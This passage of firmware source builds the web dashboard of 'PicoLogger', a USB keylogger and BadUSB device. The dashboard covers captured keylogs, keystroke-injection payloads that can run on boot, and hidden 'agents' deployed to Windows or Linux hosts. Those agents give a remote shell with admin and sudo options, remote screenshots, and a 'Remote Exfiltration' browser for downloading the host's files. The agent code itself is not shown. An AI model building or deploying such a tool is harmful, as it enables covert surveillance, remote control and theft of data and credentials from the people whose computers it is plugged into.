                <div class="key" onclick="sendKeyPress('k')">K</div>
                <div class="key" onclick="sendKeyPress('l')">L</div>
                <div class="key" onclick="sendKeyPress(';')">;</div>
                <div class="key" onclick="sendKeyPress('\'')">&#39;</div>
                <div class="key" onclick="sendKeyPress('\\')">\</div>
                <div class="key key-wide" onclick="sendKeyPress('ENTER')">ENTER</div>
                <br></br>
                <div class="key" id="ctrl" onclick="toggleKey('ctrl')">CTRL</div>
                <div class="key" id="alt" onclick="toggleKey('alt')">ALT</div>              
                <div class="key" onclick="sendKeyPress('z')">Z</div>
                <div class="key" onclick="sendKeyPress('x')">X</div>
                <div class="key" onclick="sendKeyPress('c')">C</div>
                <div class="key" onclick="sendKeyPress('v')">V</div>
                <div class="key" onclick="sendKeyPress('b')">B</div>
                <div class="key" onclick="sendKeyPress('n')">N</div>
                <div class="key" onclick="sendKeyPress('m')">M</div>
                <div class="key" onclick="sendKeyPress(',')">,</div>
                <div class="key" onclick="sendKeyPress('.')">.</div>
                <div class="key" onclick="sendKeyPress('/')">/</div>                                
                <div class="key" id="gui" onclick="toggleKey('gui')">GUI</div>
                <br></br>
                <div class="key key-space" onclick="sendKeyPress('SPACE'); sendKeyPress(' ');">SPACE</div>
            </div>
        </div>
        </div>
      </section>





<!-- ----------------------- REMOTE SHELL ------------------------ -->
      
      <section class="tab" id="tab-section4">
        <div class="card">
        <div class="container">
            <textarea id="outputBox" class="outputBox" readonly></textarea>
            <div>
            <input type="text" id="commandInput" placeholder="Enter command..." class="command-input">
            <button onclick="executeCommand()">Run</button>
            </div>
            <div class="switch-container">
              <div class="toggle-row" style="margin-top:15px;">
                <div class="toggle-item">
                  <span class="toggle-label">Admin Mode</span>
                  <label class="switch">
                    <input type="checkbox" id="adminSwitch">
                    <span class="slider"></span>
                  </label>
                </div>
                <div class="toggle-item">
                  <span class="toggle-label">Run Hidden</span>
                  <label class="switch">
                    <input type="checkbox" id="hiddenSwitch">
                    <span class="slider"></span>
                  </label>
                </div>
              </div>
                <td class="action-buttons">
                <button style="margin-top:10px;" onclick="deployAgent()">Deploy Windows Agent</button>
                <button style="margin-top:10px;" onclick="deployBashAgent()">Deploy Linux Agent</button>
                </td>
                <input type="text" id="passwordInput" placeholder="Enter sudo password..." style="width: 20%;">
            </div>
        </div>
        </div>
      </section>





<!-- ------------------------ REMOTE SCREENSHOTS ---------------------------- -->
      
      <section class="tab" id="tab-section5">
        <div class="card">
        <div class="container">
            <button onclick="takeScreenshot()">Take Screenshot</button>
            <br><br>
            <div align="center" style="width: 100%; height: 100%; overflow: hidden;">
                <img id="screenshot" src="/screenshot.jpg" alt="No screenshot available">
            </div>
            <br>
            <div class="switch-container">
            <div class="control-row"> 
              <div class="control-item">
                <label for="qualityInput" class="control-label">Quality (1–100)</label>
                <input type="number" id="qualityInput" min="1" max="100" value="10" class="small-input">
              </div>
              <div class="control-item">
                <label for="scaleInput" class="control-label">Scale 1/</label>
                <input type="number" id="scaleInput" min="1" max="10" value="2" class="small-input">
              </div>
              <div class="control-item">
                <span class="control-label">Run Hidden</span>
                <label class="switch">
                  <input type="checkbox" id="hiddenSwitch2">
                  <span class="slider"></span>
                </label>
              </div>
            </div>
                <td class="action-buttons" style="margin-top:10px;">
                <button onclick="deployAgent2()">Deploy Agent</button>
                <button onclick="exitAgent()">Close Agent</button>
                </td>
            </div>    
        </div>
        </div>
      </section>





<!-- ------------------------- REMOTE EXFILTRATION --------------------------- -->
      
      <section class="tab" id="tab-section6">
        <div class="card">
        <div class="container">
            <input type="text" id="pathInput" placeholder="Enter path, e.g., C:\\" />
            <div style="margin-bottom:10px;" id="fileList"></div>
            <div class="switch-container">
            <td class="action-buttons">
            <button style="margin-bottom:10pxpadding:10px;" onclick="listFiles()">List Files</button>
            <div class="control-row">
              <div class="control-item">
              <span class="control-label">Run Hidden</span>
                  <label class="switch">
                      <input type="checkbox" id="hiddenSwitch3">
                      <span class="slider"></span>
                  </label>
              </div>
            </div>
            <button onclick="deploy()">Deploy Agent</button>
            <button onclick="exitAgent2()">Exit Agent</button>
            </td>
            </div>
        </div>
        </div>
      </section>







<!-- --------------------------- LITTLEFS FILES ---------------------------- -->

      
      <section class="tab" id="tab-section7">
        <div class="card">
        <div class="container">
            <div class="breadcrumb">Current Directory: )rawliteral" + generateBreadcrumb(path) + R"rawliteral(</div>
            <table>
                <tr><th>Name</th><th>Type</th><th>Size</th><th>Actions</th></tr>
    )rawliteral";

    if (path != "/") {
        String parentPath = path.substring(0, path.lastIndexOf('/'));
        if (parentPath == "") parentPath = "/";
        html += "<tr><td colspan='4'><a class='folder-link' href='/dashboard?path=" + parentPath + "#section7'>.. (Up)</a></td></tr>";
    }

    Dir root = LittleFS.openDir(path);
    while (root.next()) {
        String fileName = root.fileName();
        size_t fileSize = root.fileSize();
        String fullPath = path + (path == "/" ? "" : "/") + fileName;

        bool isDir = false;
        File file = LittleFS.open(fullPath, "r");
        if (file && file.isDirectory()) {
            isDir = true;
        }
        file.close();

        html += "<tr><td>";

        if (isDir) {
            html += "<a class='folder-link' href='/dashboard?path=" + fullPath + "#section7'>" + fileName + "/</a>";
            html += "</td><td>Folder</td><td>-</td>";
        } else {
            html += fileName + "</td><td>File</td><td>" + String(fileSize) + " bytes";
        }

        html += "<td>";

        if (!isDir) {

            html += "<div class='actions'>";
            html += "<button class='shellexp' onclick=\"location.href='/download?file=" + fullPath + "'\">Download</button>";
            html += "<button class='shellexp' onclick=\"location.href='/edit?file=" + fullPath + "'\">Edit</button>";
            html += "<button class='shellexp' onclick=\"confirmDelete('" + fullPath + "')\">Delete</button>";
            html += "</div>";
        }

        html += "</td></tr>";
    }

    html += R"rawliteral(</table>
        </div>

        </div>
      </section>




<!-- -------------------------------- SETTINGS ----------------------------- -->


      <section class="tab" id="tab-section8">
        <div class="card">
        <div class="container">
            <div class="input-group">
                <label for="ssid">WiFi SSID:</label>
                <input type="text" id="ssid" placeholder="Enter WiFi SSID">
            </div>
            <div class="input-group">
                <label for="password">WiFi Password:</label>
                <input type="text" id="password" placeholder="Enter WiFi Password">
            </div>        
            <div class="input-group">
                <label for="layout">Keyboard Layout:</label>
                <select id="layout">
                    <option value="us">US</option>
                    <option value="fr">French</option>
                    <option value="de">German</option>
                    <option value="es">Spanish</option>
                    <option value="it">Italian</option>
                    <option value="pt">Portuguese</option>
                    <option value="fi">Finnish</option>
                    <option value="be">Belgian</option>
                    <option value="br">Brazilian</option>
                    <option value="tr">Turkish</option>
                    <option value="dk">Danish</option>
                    <option value="uk">UK</option>
                </select>
            </div>
            <div class="input-group">
                <label for="loginUser">Login Username:</label>
                <input type="text" id="loginUser" placeholder="Enter Login Username">
            </div>
            <div class="input-group">
                <label for="loginPass">Login Password:</label>
                <input type="text" id="loginPass" placeholder="Enter Login Password">
            </div>
            <div style="margin-bottom:10px;" class="input-group">
                <label for="wifiState">WiFi ON/OFF:</label>
                <label class="switch">
                    <input type="checkbox" id="wifiState">
                    <span class="slider"></span>
                </label>
                 
            </div>
            <button onclick="saveSettings()">Save</button>
            <button onclick="formatLittleFS()" class="warning">Format LittleFS</button>
            <button onclick="rebootPico()" class="warning">Reboot PicoLogger</button>
        </div>
        </div>
      </section>



    </main>
  </div>



<!-- -------------------------- PICOLOGGER JS -------------------------- -->

  <script>
    const $ = (q, el=document) => el.querySelector(q);
    const $$ = (q, el=document) => Array.from(el.querySelectorAll(q));

    const tabMeta = {
      section1: { title:"Keylogger Logs", subtitle:"View and manage USB keylogger logs" },
      section2: { title:"BadUSB Payloads", subtitle:"Create, edit and run payloads" },
      section3: { title:"Virtual Keyboard", subtitle:"Send keystrokes to host" },
      section4: { title:"Remote Shell", subtitle:"Remote shell over serial" },
      section5: { title:"Remote Screenshot", subtitle:"Remote screenshots over serial" },
      section6: { title:"Remote Exfiltration", subtitle:"Browse and download the host filesystem" },
      section7: { title:"LittleFS File Manager", subtitle:"Local filesystem explorer" },
      section8: { title:"Settings", subtitle:"Manage settings for picologger" },
    };

    function setTab(name){
      $$("#nav button").forEach(b => b.classList.toggle("active", b.dataset.tab === name));
      $$(".tab").forEach(t => t.classList.toggle("active", t.id === `tab-${name}`));

      $("#tabTitle").textContent = tabMeta[name]?.title || name;
      $("#tabSubtitle").textContent = tabMeta[name]?.subtitle || "";

      location.hash = name;
      $("#sidebar").classList.remove("open");
    }

    $$("#nav button").forEach(btn => btn.addEventListener("click", () => setTab(btn.dataset.tab)));

    $("#burger").addEventListener("click", () => $("#sidebar").classList.toggle("open"));

    window.addEventListener("hashchange", () => {
      const name = (location.hash || "#section1").slice(1);
      if(tabMeta[name]) setTab(name);
    });

    $("#logoutBtn").addEventListener("click", () => {
      location.href = "/logout";
    });

    (function init(){
      const name = (location.hash || "#section1").slice(1);
      if(tabMeta[name]) setTab(name);
      else setTab("section1");
    })();
  </script>
        <script>
            function toggleMenu() {
                const overlay = document.getElementById("menuOverlay");
                overlay.classList.toggle("active");
            }
            function loadPayloads() {
                fetch('/list_payloads')
                .then(response => response.json())
                .then(payloads => {
                    fetch('/list_boot_payloads')
                    .then(response => response.json())
                    .then(enabledPayloads => {
                        let table = document.getElementById('payloadTable');
                        table.innerHTML = '<tr><th>Filename</th><th>Actions</th><th>Boot</th></tr>';
                        payloads.forEach(file => {
                            let isChecked = enabledPayloads.includes(file) ? "checked" : "";
                            table.innerHTML += `
                                <tr>
                                    <td>${file}</td>
                                    <td class="action-buttons">
                                        <button onclick="runPayload('${file}')">Run</button>
                                        <button onclick="editPayload('${file}')">Edit</button>
                                        <button onclick="deletePayload('${file}')">Delete</button>
                                    </td>
                                    <td>
                                        <label style="margin-top: 10px;" class="switch">
                                            <input type="checkbox" onchange="togglePayloadOnBoot('${file}', this.checked)" id="boot-${file}" ${isChecked}>
                                            <span class="slider"></span>
                                        </label>
                                    </td>
                                </tr>
                            `;
                        });
                    });
                });
            }
            function togglePayloadOnBoot(filename, enable) {
                fetch('/toggle_payload_boot', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `filename=${encodeURIComponent(filename)}&enable=${enable ? 1 : 0}`
                }).then(() => {
                    alert(`Payload ${filename} ${enable ? 'enabled' : 'disabled'} on boot!`);
                });
            }
            function createNewFile() {
                let filename = document.getElementById('filename').value;
                let content = document.getElementById('editor').value;
                savePayload(filename, content);
            }
            function savePayload(filename, content) {
                fetch('/save_payload', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `filename=${encodeURIComponent(filename)}&content=${encodeURIComponent(content)}`
                }).then(() => {
                    alert("Saved successfully!");
                    loadPayloads();
                });
            }
            function deletePayload(filename) {
                fetch('/delete_payload', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `filename=${encodeURIComponent(filename)}`
                }).then(() => {
                    alert("Deleted successfully!");
                    loadPayloads();
                });
            }
            function runPayload(filename) {
                fetch('/run_payload', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `filename=${encodeURIComponent(filename)}`
                }).then(() => alert("Payload executed!"));
            }
            function editPayload(filename) {
                fetch(`/get-payload?filename=${encodeURIComponent(filename)}`)
                .then(response => {
                    if (!response.ok) {
                        throw new Error("Failed to fetch payload");
                    }
                    return response.text();
                })
                .then(data => {
                    document.getElementById('filename').value = filename;
                    document.getElementById('editor').value = data;
                })
                .catch(error => {
                    console.error("Error fetching payload:", error);
                });
            }


            function saveSettings() {
                const ssid = document.getElementById('ssid').value;
                const password = document.getElementById('password').value;
                const wifiState = document.getElementById('wifiState').checked ? 'ON' : 'OFF';
                const layout = document.getElementById('layout').value;
                const loginUser = document.getElementById('loginUser').value;
                const loginPass = document.getElementById('loginPass').value;

            
                fetch('/save_settings', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `ssid=${encodeURIComponent(ssid)}&password=${encodeURIComponent(password)}&wifiState=${wifiState}&layout=${layout}&loginUser=${encodeURIComponent(loginUser)}&loginPass=${encodeURIComponent(loginPass)}`
                })
                .then(response => {
                    if (response.ok) {
                        alert("Settings saved successfully!");
                    } else {
                        alert("Failed to save settings! Server responded with status: " + response.status);
                    }
                })
                .catch(err => {
                    alert("Network error: Failed to save settings!");
                    console.error("Error:", err);
                });
            }
            function formatLittleFS() {
                if (confirm('Are you sure you want to format the LittleFS? All data will be lost.')) {
                    fetch('/format_littlefs', { method: 'POST' })
                        .then(() => alert('LittleFS formatted successfully!'))
                        .catch(err => alert('Failed to format LittleFS!'));
                }
            }
            function rebootPico() {
                if (confirm('Are you sure you want reboot PicoLogger?')) {
                    fetch('/reboot_pico', { method: 'POST' })
                        .then(() => alert('Restarting PicoLogger!'))
                        .catch();
                }
            }

            let capsLock = false;
            let shiftActive = false;
            let guiActive = false;
            let altActive = false;
            let ctrlActive = false;
            function sendKeyPress(key) {
                let keys = [];
                if (ctrlActive) keys.push("CTRL");
                if (altActive) keys.push("ALT");
                if (guiActive) keys.push("GUI");
                if (key.length === 1) {
                    if (shiftActive || capsLock) {
                        key = key.toUpperCase();
                    } else {
                        key = key.toLowerCase();
                    }
                }
                keys.push(key);
                let combo = keys.join("+");
                fetch('/keypress', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'key=' + encodeURIComponent(combo)
                }).then(response => response.text()).then(data => {
                    console.log('Key sent:', combo);
                }).catch(error => console.error('Error:', error));

                if (shiftActive) {
                    toggleShift(false);
                }
            }
            function toggleCapsLock() {
                capsLock = !capsLock;
                document.getElementById('capslock').classList.toggle('active2', capsLock);
            }
            function toggleShift(state) {
                shiftActive = state;
                document.getElementById('shift').classList.toggle('active2', shiftActive);
            }
            function toggleKey(key) {
                let element = document.getElementById(key);
                let state = !eval(key + "Active");
                eval(key + "Active = state;");
                element.classList.toggle('active2', state);
            }

            function loadPassword() {
                fetch('/get_password')
                    .then(response => response.text())
                    .then(password => {
                        document.getElementById("passwordInput").value = password;
                    })
                    .catch(error => console.error('Error loading password:', error));
            }            
            function deployBashAgent() {
                let password = document.getElementById("passwordInput").value;
                let hiddenMode = document.getElementById("hiddenSwitch").checked ? "1" : "0";
                fetch('/deploy_linux', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'password=' + encodeURIComponent(password) + '&hidden=' + hiddenMode
                })
                .then(response => response.text())
                .then(output => {
                    alert(output);
                })
                .catch(error => console.error('Error deploying bash agent:', error));
            }
            function deployAgent() {
                let adminMode = document.getElementById("adminSwitch").checked ? "1" : "0";
                let hiddenMode = document.getElementById("hiddenSwitch").checked ? "1" : "0";

                fetch('/deploy', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'admin=' + adminMode + '&hidden=' + hiddenMode
                })
                .then(response => response.text())
                .then(output => {
                    alert("Agent Deployed!");
                })
                .catch(error => console.error('Error deploying agent:', error));
            }
            function executeCommand() {
                let command = document.getElementById("commandInput").value;
                if (command.trim() === "") return;
                
                fetch('/execute', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'command=' + encodeURIComponent(command)
                })
                .then(response => response.text())
                .then(output => {
                    document.getElementById("outputBox").value += "\n> " + command + "\n" + output + "\n";
                    document.getElementById("commandInput").value = "";
                })
                .catch(error => console.error('Error executing command:', error));
            }

            function deployAgent2() {
                let hiddenMode = document.getElementById("hiddenSwitch2").checked ? "1" : "0";
                let q = document.getElementById("qualityInput").value;
                let s = document.getElementById("scaleInput").value;
            
                fetch('/deploy-screenshot', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `hidden=${hiddenMode}&q=${q}&s=${s}`
                })
                .then(response => response.text())
                .then(output => {
                    alert("Agent Deployed");
                })
                .catch(error => console.error('Error deploying agent:', error));
            }
            function takeScreenshot() {
                fetch('/take-screenshot', { method: 'POST' })
                .then(response => response.text())
                .then(() => setTimeout(loadImage, 5000));
            }
            function exitAgent() {
                fetch('/exit-agent', { method: 'POST' })
                .then(response => response.text())
                alert("Agent Closed");
            }
            function loadImage() {
                const img = document.getElementById('screenshot');
                img.src = "/screenshot.jpg?t=" + new Date().getTime();
                img.style.display = 'block';
            }


            function confirmDelete(filePath) {
                if (confirm("Are you sure you want to delete this file?")) {
                    location.href = '/delete?file=' + encodeURIComponent(filePath);
                }
            }

            function formatSize(bytes) {
                if (bytes === "0" || bytes === 0) return "0 B";
                const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
                let i = 0;
                let num = parseInt(bytes, 10);
                while (num >= 1024 && i < sizes.length - 1) {
                    num /= 1024;
                    i++;
                }
                return num.toFixed(2) + ' ' + sizes[i];
            }
            
            function listFiles(path = null) {
                const input = document.getElementById("pathInput");
                const currentPath = path !== null ? path : input.value;
                input.value = currentPath;
                fetch("/list_files?path=" + encodeURIComponent(currentPath))
                .then(res => res.text())
                .then(data => {
                    const list = document.getElementById("fileList");
                    list.innerHTML = "";
                    if (currentPath.length > 3) {
                        const normalized = currentPath.replace(/\\+$/, "");
                        const parts = normalized.split("\\");
                        parts.pop();
                        let parentPath = parts.join("\\");
                        if (/^[A-Za-z]:$/.test(parentPath)) {
                            parentPath += "\\";
                        }
                        const upEntry = document.createElement("div");
                        upEntry.className = "file-entry";
            
                        const escapedParent = parentPath.replace(/\\/g, '\\\\');
                        upEntry.innerHTML = `<span onclick="listFiles('${escapedParent}')">[..]</span>`;
                        list.appendChild(upEntry);
                    }
                    data.split("\n").forEach(line => {
                        if (line.trim() === "") return;
                        let [type, fullpath, size] = line.split("|||");
                        if (type === "dir") type = "Folder";
                        else if (type === "file") type = "File";
                        size = formatSize(size);        
                        const entry = document.createElement("div");
                        entry.className = "file-entry";            
                        const escapedPath = fullpath.replace(/\\/g, '\\\\');           
                        if (type === "Folder") {
                            entry.innerHTML = `<span class="file-name" onclick="listFiles('${escapedPath}')">${fullpath}</span>` +
                                              `<span class="file-type">${type}</span>` +
                                              `<span class="file-size"></span>`;
                        } else {
                            entry.innerHTML = `<span class="file-name">${fullpath}</span>` +
                                              `<span class="file-type">${type}</span>` +
                                              `<span class="file-size">${size}</span>` +
                                              `<span class="file-actions"><button onclick="downloadFile('${escapedPath}')">Download</button></span>`;
                        }
                        list.appendChild(entry);
                    });
                });
            }
            function downloadFile(path) {
                fetch("/download_file?path=" + encodeURIComponent(path))
                    .then(res => res.text())
                    .then(msg => alert(msg))
                    .catch(err => alert("Error: " + err));
            }
            function deploy() {
                const hiddenMode = document.getElementById("hiddenSwitch3").checked ? "1" : "0";          
                fetch("/deploy_explorer", {
                    method: "POST",
                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
                    body: `hidden=${hiddenMode}`
                })
                .then(res => res.text())
                .then(msg => alert("File Agent Deployed"))
                .catch(err => alert("Failed to deploy agent: " + err));
            }
            function exitAgent2() {
                fetch("/exit_agent", { method: 'POST' }).then(() => alert("Agent stopped."));
            }

            
            let currentEdit = null;
            function toggleMenu() {
                const overlay = document.getElementById("menuOverlay");
                overlay.classList.toggle("active");
            }
            function saveEntry() {
              const title = document.getElementById("title").value;
              const username = document.getElementById("username").value;
              const password = document.getElementById("password").value;
              if (!title || !username || !password) {
                alert("All fields are required.");
                return;
              }
              fetch("/savepass", {
                method: "POST",
                headers: {"Content-Type":"application/x-www-form-urlencoded"},
                body: `title=${encodeURIComponent(title)}&username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
              }).then(() => location.reload());
            }
      
            function editEntry(title, username, password) {
              document.getElementById("title").value = title;
              document.getElementById("username").value = username;
              document.getElementById("password").value = password;
              currentEdit = title;
            }
      
            function deleteEntry(title) {
              if (confirm(`Delete "${title}"?`)) {
                fetch(`/deletepass?title=${encodeURIComponent(title)}`).then(() => location.reload());
              }
            }
            function autofillEntry(username, password) {
              alert("Click OK to type USERNAME.")
              fetch("/autofill-username", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: `username=${encodeURIComponent(username)}`
              }).then(() => {
                alert("Click OK to type PASSWORD.");
                fetch("/autofill-password", {
                  method: "POST",
                  headers: { "Content-Type": "application/x-www-form-urlencoded" },
                  body: `password=${encodeURIComponent(password)}`
                });
              });
            }
      


            document.addEventListener("DOMContentLoaded", loadPassword);
            document.addEventListener("DOMContentLoaded", function() {
                document.getElementById("commandInput").addEventListener("keypress", function(event) {
                    if (event.key === "Enter") {
                        event.preventDefault();
                        executeCommand();
                    }
                });
            });
            
            window.addEventListener('load', () => {
                listFiles("C:\\\\");
            });

            window.addEventListener('load', loadPayloads);
            window.addEventListener('load', loadImage);
            window.addEventListener('load', function () {
                fetch('/load_settings')
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById('ssid').value = data.ssid;
                        document.getElementById('password').value = data.password;
                        document.getElementById('wifiState').checked = data.wifiState === 'ON';
                        document.getElementById('layout').value = data.layout || 'us';
                        document.getElementById('loginUser').value = data.loginUser || 'admin';
                        document.getElementById('loginPass').value = data.loginPass || 'password';
                    });
            });

        </script>

<!-- -------------------------- VIBECODE BACKGROUND -------------------------- -->

        <script>
        (() => {
          const canvas = document.getElementById("starfield");
          if (!canvas) return;
          const ctx = canvas.getContext("2d", { alpha: true });
          let w = 0, h = 0, dpr = Math.max(1, Math.min(2, window.devicePixelRatio || 1));
          const reduceMotion = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
        
          const STAR_COUNT = 620;
          const BASE_DRIFT = 0.08;
          const REPEL_RADIUS = 140;
          const REPEL_STRENGTH = 3.2;
          const RETURN_FORCE = 0.025;
          const DAMPING = 0.69;
        
          const stars = [];
          const mouse = { x: -9999, y: -9999, active: false };
          const rand = (min, max) => min + Math.random() * (max - min);
        
          function resize() {
            w = canvas.clientWidth || window.innerWidth;
            h = canvas.clientHeight || window.innerHeight;
            dpr = Math.max(1, Math.min(2, window.devicePixelRatio || 1));
            canvas.width = Math.floor(w * dpr);
            canvas.height = Math.floor(h * dpr);
            ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
        
            stars.length = 0;
            for (let i = 0; i < STAR_COUNT; i++) {
              const x = Math.random() * w, y = Math.random() * h;
              const r = Math.pow(Math.random(), 2.4) * 2.2 + 0.25;
              const a = Math.pow(Math.random(), 1.8) * 0.9 + 0.08;
              const tint = Math.random();
              const color =
                tint < 0.12 ? `rgba(138,107,255,${a})` :
                tint < 0.24 ? `rgba(57,255,136,${a})` :
                              `rgba(238,240,255,${a})`;
              stars.push({ x, y, ox: x, oy: y, vx: 0, vy: 0, r, a, color, tw: rand(0.6, 1.6), ph: rand(0, Math.PI * 2) });
            }
          }
        
          function setMouse(e) {
            const rect = canvas.getBoundingClientRect();
            mouse.x = e.clientX - rect.left;
            mouse.y = e.clientY - rect.top;
            mouse.active = true;
          }
        
          function clearMouse() {
            mouse.active = false;
            mouse.x = -9999;
            mouse.y = -9999;
          }
        
          window.addEventListener("mousemove", setMouse, { passive: true });
          window.addEventListener("mouseleave", clearMouse, { passive: true });
          window.addEventListener("blur", clearMouse, { passive: true });
          window.addEventListener("touchstart", (e) => e.touches && e.touches[0] && setMouse(e.touches[0]), { passive: true });
          window.addEventListener("touchmove", (e) => e.touches && e.touches[0] && setMouse(e.touches[0]), { passive: true });
          window.addEventListener("touchend", clearMouse, { passive: true });
          window.addEventListener("resize", resize);
        
          function draw() {
            ctx.clearRect(0, 0, w, h);
        
            for (let i = 0; i < stars.length; i++) {
              const s = stars[i];
        
              if (!reduceMotion) {
                s.vx += (Math.sin(s.ph + performance.now() * 0.0003) * BASE_DRIFT) * 0.02;
                s.vy += (Math.cos(s.ph + performance.now() * 0.00025) * BASE_DRIFT) * 0.02;
        
                if (mouse.active) {
                  const dx = s.x - mouse.x, dy = s.y - mouse.y;
                  const dist2 = dx * dx + dy * dy;
                  const r = REPEL_RADIUS;
                  if (dist2 < r * r) {
                    const dist = Math.max(0.001, Math.sqrt(dist2));
                    const falloff = 1 - dist / r;
                    const force = REPEL_STRENGTH * falloff * falloff;
                    s.vx += (dx / dist) * force;
                    s.vy += (dy / dist) * force;
                  }
                }
        
                s.vx += (s.ox - s.x) * RETURN_FORCE;
                s.vy += (s.oy - s.y) * RETURN_FORCE;
                s.vx *= DAMPING;
                s.vy *= DAMPING;
                s.x += s.vx;
                s.y += s.vy;
              }
        
              const tw = reduceMotion ? 1 : (0.75 + 0.25 * Math.sin(s.ph + performance.now() * 0.0012 * s.tw));
              const alpha = Math.max(0, Math.min(1, s.a * tw));
        
              ctx.beginPath();
              ctx.fillStyle = s.color.replace(
                /rgba\(([^,]+),([^,]+),([^,]+),([^)]+)\)/,
                (m, r, g, b) => `rgba(${r},${g},${b},${alpha})`
              );
              ctx.shadowBlur = 10 * s.r;
              ctx.shadowColor = ctx.fillStyle;
              ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
              ctx.fill();
              ctx.shadowBlur = 0;
            }
        
            requestAnimationFrame(draw);
          }
        
          resize();
          draw();
        })();
        </script>

    )rawliteral";

    if (!isLoggedIn) {
        server.sendHeader("Location", "/login");
        server.send(302, "text/plain", "Redirecting to login...");
        return;
    }else{
        server.send(200, "text/html", html);
    }
}

